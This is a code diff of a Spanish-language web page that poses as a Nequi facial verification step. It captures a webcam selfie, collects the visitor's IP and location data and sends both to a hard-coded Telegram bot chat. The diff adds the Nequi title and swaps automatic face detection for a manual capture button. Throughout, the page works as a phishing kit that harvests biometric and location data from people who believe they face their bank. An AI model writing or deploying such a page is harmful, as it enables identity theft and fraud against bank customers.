@@ -3,8 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+<title>Verificación Facial - Nequi</title>
 
 <style>
 body {
@@ -42,6 +41,7 @@ video {
     left: 50%;
     transform: translate(-50%, -50%);
     transition: 0.2s;
+    pointer-events: none;
 }
 
 .valid {
@@ -61,26 +61,34 @@ video {
     z-index: 10;
 }
 
-/* Barra de progreso */
-.progress-container {
+/* Botón de captura */
+.capture-btn {
     position: absolute;
     bottom: 100px;
     left: 50%;
     transform: translateX(-50%);
-    width: 200px;
-    height: 4px;
-    background: rgba(255,255,255,0.3);
-    border-radius: 2px;
-    overflow: hidden;
-    z-index: 10;
+    background: rgba(0,255,136,0.9);
+    color: #2b002b;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 50px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    z-index: 20;
+    transition: all 0.2s;
+    font-family: monospace;
 }
 
-.progress-bar {
-    height: 100%;
-    width: 0%;
+.capture-btn:hover {
     background: #00ff88;
-    transition: width 0.1s linear;
-    border-radius: 2px;
+    transform: translateX(-50%) scale(1.05);
+}
+
+.capture-btn:disabled {
+    background: rgba(100,100,100,0.7);
+    cursor: not-allowed;
+    transform: translateX(-50%);
 }
 
 /* Preview de foto */
@@ -282,9 +290,7 @@ video {
 <div class="overlay"></div>
 <div class="oval" id="oval"></div>
 <div class="status" id="status">🎯 Iniciando cámara...</div>
-<div class="progress-container">
-    <div class="progress-bar" id="progressBar"></div>
-</div>
+<button class="capture-btn" id="captureBtn">📸 Tomar Selfie</button>
 <button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
 <button class="send-btn" id="sendBtn">📤 Enviar a Telegram</button>
 <div class="status-message" id="statusMessage"></div>
@@ -297,7 +303,7 @@ video {
 const video = document.getElementById("video");
 const oval = document.getElementById("oval");
 const statusText = document.getElementById("status");
-const progressBar = document.getElementById("progressBar");
+const captureBtn = document.getElementById("captureBtn");
 const resetBtn = document.getElementById("resetBtn");
 const sendBtn = document.getElementById("sendBtn");
 const statusMessage = document.getElementById("statusMessage");
@@ -310,15 +316,8 @@ const TELEGRAM_CONFIG = {
     chatId: "7776240161"
 };
 
-let countdown = null;
-let stableFrames = 0;
 let photoTaken = false;
 let currentPhotoData = null;
-
-// Configuración
-const REQUIRED_FRAMES = 8;
-const TOLERANCIA_X = 90;
-const TOLERANCIA_Y = 130;
 
 // Iniciar cámara
 navigator.mediaDevices.getUserMedia({ 
@@ -330,141 +329,21 @@ navigator.mediaDevices.getUserMedia({
 })
 .then(stream => {
     video.srcObject = stream;
-    statusText.innerText = "📷 Coloca tu rostro en el óvalo";
+    statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
+    captureBtn.disabled = false;
 })
 .catch(err => {
     console.error("Error de cámara:", err);
     statusText.innerText = "❌ Error: No se puede acceder a la cámara";
+    captureBtn.disabled = true;
 });
-
-// Cargar modelos de Face-API
-Promise.all([
-    faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models'),
-    faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models')
-]).then(() => {
-    statusText.innerText = "✅ Cámara lista - Coloca tu rostro en el óvalo";
-    startValidation();
-}).catch(err => {
-    console.error("Error cargando modelos:", err);
-    statusText.innerText = "❌ Error cargando IA. Recarga la página.";
-});
-
-function startValidation() {
-    setInterval(async () => {
-        if (photoTaken || !video.videoWidth) return;
-        
-        try {
-            const result = await faceapi
-                .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
-                .withFaceLandmarks();
-            
-            if (!result) {
-                reset("❌ No se detecta rostro");
-                return;
-            }
-            
-            // Escalar coordenadas
-            const rect = video.getBoundingClientRect();
-            const scaleX = rect.width / video.videoWidth;
-            const scaleY = rect.height / video.videoHeight;
-            
-            const box = result.detection.box;
-            const faceX = (box.x + box.width / 2) * scaleX;
-            const faceY = (box.y + box.height / 2) * scaleY;
-            
-            const ovalRect = oval.getBoundingClientRect();
-            const centerX = ovalRect.left + ovalRect.width / 2;
-            const centerY = ovalRect.top + ovalRect.height / 2;
-            
-            const dx = Math.abs(faceX - centerX);
-            const dy = Math.abs(faceY - centerY);
-            
-            // Detección de ojos abiertos
-            const landmarks = result.landmarks;
-            const leftEye = landmarks.getLeftEye();
-            const rightEye = landmarks.getRightEye();
-            
-            function eyeOpen(eye) {
-                const height = Math.abs(eye[1].y - eye[5].y);
-                const width = Math.abs(eye[0].x - eye[3].x);
-                return (height / width) > 0.25;
-            }
-            
-            const eyesOpen = eyeOpen(leftEye) && eyeOpen(rightEye);
-            const inside = dx < TOLERANCIA_X && dy < TOLERANCIA_Y;
-            
-            if (inside && eyesOpen) {
-                oval.classList.add("valid");
-                stableFrames++;
-                
-                // Actualizar barra de progreso
-                const progress = (stableFrames / REQUIRED_FRAMES) * 100;
-                progressBar.style.width = `${progress}%`;
-                
-                if (stableFrames >= REQUIRED_FRAMES && !countdown && !photoTaken) {
-                    startCountdown();
-                } else {
-                    statusText.innerText = `✅ Rostro correcto (${stableFrames}/${REQUIRED_FRAMES})`;
-                }
-            } else {
-                if (!eyesOpen) {
-                    reset("👁️ Abre los ojos");
-                } else if (!inside) {
-                    let msg = "";
-                    if (dx > TOLERANCIA_X && dy > TOLERANCIA_Y) msg = "⬅️⬆️ Centra tu rostro";
-                    else if (dx > TOLERANCIA_X) msg = "⬅️➡️ Centra horizontalmente";
-                    else if (dy > TOLERANCIA_Y) msg = "⬆️⬇️ Centra verticalmente";
-                    else msg = "🎯 Centra tu rostro en el óvalo";
-                    reset(msg);
-                } else {
-                    reset("⚠️ Mantén tu rostro estable");
-                }
-                oval.classList.remove("valid");
-                stableFrames = 0;
-                progressBar.style.width = "0%";
-            }
-        } catch (err) {
-            console.error("Error en detección:", err);
-        }
-    }, 150);
-}
-
-function startCountdown() {
-    if (countdown) return;
-    
-    let t = 3;
-    statusText.innerText = "📸 ¡No te muevas! (" + t + ")";
-    
-    countdown = setInterval(() => {
-        t--;
-        
-        if (t > 0) {
-            statusText.innerText = "📸 ¡No te muevas! (" + t + ")";
-        } else {
-            clearInterval(countdown);
-            countdown = null;
-            takePhoto();
-        }
-    }, 1000);
-}
-
-function reset(msg) {
-    if (photoTaken) return;
-    statusText.innerText = msg;
-    oval.classList.remove("valid");
-    stableFrames = 0;
-    progressBar.style.width = "0%";
-    
-    if (countdown) {
-        clearInterval(countdown);
-        countdown = null;
-    }
-}
 
 // Tomar foto
 function takePhoto() {
-    if (photoTaken) return;
-    photoTaken = true;
+    if (photoTaken) {
+        mostrarMensaje("Ya tienes una selfie, reinicia para tomar otra", true);
+        return;
+    }
     
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
@@ -478,12 +357,17 @@ function takePhoto() {
     ctx.setTransform(1, 0, 0, 1, 0, 0);
     
     currentPhotoData = canvas.toDataURL("image/png");
+    photoTaken = true;
+    
+    // Cambiar color del óvalo a verde
+    oval.classList.add("valid");
     
     showSuccessToast();
     statusText.innerText = "✅ ¡Selfie capturada con éxito!";
     
     createPhotoPreview(currentPhotoData);
     sendBtn.style.display = "block";
+    captureBtn.disabled = true;
 }
 
 function showSuccessToast() {
@@ -516,13 +400,10 @@ function createPhotoPreview(imgData) {
         sendBtn.style.display = "none";
         photoTaken = false;
         currentPhotoData = null;
-        reset("🎯 Reiniciado - Coloca tu rostro");
         oval.classList.remove("valid");
-        progressBar.style.width = "0%";
-        statusText.innerText = "✅ Listo para nueva selfie";
-        setTimeout(() => {
-            statusText.innerText = "🎯 Coloca tu rostro en el óvalo";
-        }, 2000);
+        captureBtn.disabled = false;
+        statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
+        mostrarMensaje("Selfie eliminada, puedes tomar otra", false);
     };
     
     preview.appendChild(img);
@@ -571,8 +452,8 @@ async function enviarATelegram() {
         const blob = dataURLtoBlob(currentPhotoData);
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-        formData.append('caption', `🤳 Selfie Verificada - ${new Date().toLocaleString('es-CO')}`);
-        formData.append('photo', blob, `selfie_verificada.jpg`);
+        formData.append('caption', `🤳 Selfie - ${new Date().toLocaleString('es-CO')}`);
+        formData.append('photo', blob, `selfie.jpg`);
         
         await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
             method: 'POST',
@@ -581,11 +462,9 @@ async function enviarATelegram() {
         
         // Enviar mensaje con información adicional
         const mensajeInfo = `
-🔔 **VERIFICACIÓN FACIAL COMPLETADA** 🔔
+🔔 **NUEVA SELFIE CAPTURADA** 🔔
 
-✅ Selfie con validación facial exitosa
-👁️ Ojos abiertos verificados
-🎯 Rostro centrado correctamente
+✅ Selfie tomada correctamente
 
 🌍 **DATOS DE UBICACIÓN:**
 📍 IP: ${ipData.ip}
@@ -596,8 +475,6 @@ async function enviarATelegram() {
 
 ⏰ **FECHA Y HORA:**
 📅 ${new Date().toLocaleString('es-CO')}
-
-✅ **ESTADO:** Verificación facial exitosa
 `;
         
         await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
@@ -611,7 +488,7 @@ async function enviarATelegram() {
         });
         
         loader.classList.remove('active');
-        mostrarMensaje("✅ Verificación enviada correctamente");
+        mostrarMensaje("✅ Selfie enviada correctamente");
         
         // Deshabilitar botón de enviar
         sendBtn.style.display = 'none';
@@ -624,33 +501,28 @@ async function enviarATelegram() {
     } catch (error) {
         console.error('Error enviando a Telegram:', error);
         loader.classList.remove('active');
-        mostrarMensaje("Error al enviar la verificación. Intenta nuevamente.", true);
+        mostrarMensaje("Error al enviar la selfie. Intenta nuevamente.", true);
     }
 }
 
+// Botón de capturar
+captureBtn.addEventListener('click', () => {
+    takePhoto();
+});
+
 // Botón de reinicio
 resetBtn.addEventListener('click', () => {
-    if (countdown) {
-        clearInterval(countdown);
-        countdown = null;
-    }
-    
     photoTaken = false;
     currentPhotoData = null;
-    stableFrames = 0;
-    progressBar.style.width = "0%";
+    oval.classList.remove("valid");
+    captureBtn.disabled = false;
     sendBtn.style.display = "none";
     
     const preview = document.querySelector('.photo-preview');
     if (preview) preview.remove();
     
-    reset("🔄 Reiniciado - Coloca tu rostro");
-    oval.classList.remove("valid");
-    
-    statusText.innerText = "✅ Listo para nueva selfie";
-    setTimeout(() => {
-        statusText.innerText = "🎯 Coloca tu rostro en el óvalo";
-    }, 2000);
+    statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
+    mostrarMensaje("Reiniciado, puedes tomar una nueva selfie", false);
 });
 
 // Botón de enviar a Telegram
